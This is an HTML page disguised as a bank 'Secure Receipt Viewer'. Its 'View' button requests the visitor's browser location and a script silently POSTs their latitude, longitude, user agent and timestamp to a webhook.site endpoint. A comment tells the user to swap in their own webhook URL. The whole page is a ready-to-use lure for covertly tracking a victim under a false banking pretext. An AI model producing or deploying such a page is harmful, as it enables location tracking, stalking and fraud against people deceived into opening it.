<!DOCTYPE html>
<html>
<head>
  <title>Bank Transaction Receipt</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 100px;
    }
    .container {
      border: 1px solid #ccc;
      padding: 40px;
      width: 300px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Secure Receipt Viewer</h2>
    <p>Loading receipt... please allow location access.</p>
    <button onclick="getLocation()">View</button>
    <p id="status"></p>
  </div>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
        document.getElementById("status").innerText = "Requesting location...";
      } else {
        document.getElementById("status").innerText = "Geolocation not supported.";
      }
    }

    function showPosition(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const userAgent = navigator.userAgent;

      // Replace below with your Webhook URL from webhook.site
      fetch("https://webhook.site/badbb57b-df0b-4339-9064-0e7ddc716651", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          latitude: lat,
          longitude: lon,
          userAgent: userAgent,
          timestamp: new Date().toISOString()
        })
      });

      document.getElementById("status").innerText = `Location sent: ${lat}, ${lon}`;
    }

    function showError(error) {
      document.getElementById("status").innerText = "Error retrieving location.";
    }
  </script>
</body>
</html>
